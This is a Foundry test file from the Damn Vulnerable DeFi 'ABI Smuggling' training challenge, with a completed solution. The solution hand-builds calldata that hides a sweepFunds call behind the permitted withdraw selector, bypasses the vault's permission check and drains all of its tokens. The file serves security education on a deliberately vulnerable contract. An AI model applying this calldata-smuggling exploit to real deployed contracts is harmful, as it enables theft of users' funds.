// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(
            hex"85fb709d",
            deployer,
            address(vault)
        );
        bytes32 playerPermission = vault.getActionId(
            hex"d9caed12",
            player,
            address(vault)
        );
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        bytes memory sweepFunds_calldata = abi.encodeCall(
            SelfAuthorizedVault.sweepFunds,
            (recovery, IERC20(address(token)))
        );
        // console.logBytes(sweepFunds_calldata);
        // 0x85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b

        bytes memory execute_calldata = abi.encodeCall(
            AuthorizedExecutor.execute,
            (address(vault), sweepFunds_calldata)
        );

        console.logBytes(execute_calldata);

        /**
         * 0x1cff79cd
         * 00:0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
         * 20:0000000000000000000000000000000000000000000000000000000000000040
         * 40:0000000000000000000000000000000000000000000000000000000000000044
         * 60:85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca
         * 80:5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c
         * a0:7bacee9b00000000000000000000000000000000000000000000000000000000
         */

        (bool result, ) = address(vault).call(execute_calldata);

        assertEq(result, false);

        // player 调用合约 calldataload(4 + 32 * 3） = d9caed12

        /**
         * 0x1cff79cd
         * 00:0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
         * 20:0000000000000000000000000000000000000000000000000000000000000080
         * 40:0000000000000000000000000000000000000000000000000000000000000044
         * 60:d9caed1200000000000000000000000000000000000000000000000000000000
         * 80:0000000000000000000000000000000000000000000000000000000000000044
         * a0:85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca
         * c0:5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c
         * e0:7bacee9b00000000000000000000000000000000000000000000000000000000
         */

        bytes
            memory new_execute_calldata = hex"1cff79cd0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b26400000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000044d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000";
        (bool success, ) = address(vault).call(new_execute_calldata);

        assertEq(success, true);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

// forge test --match-contract ABISmugglingChallenge -vvv
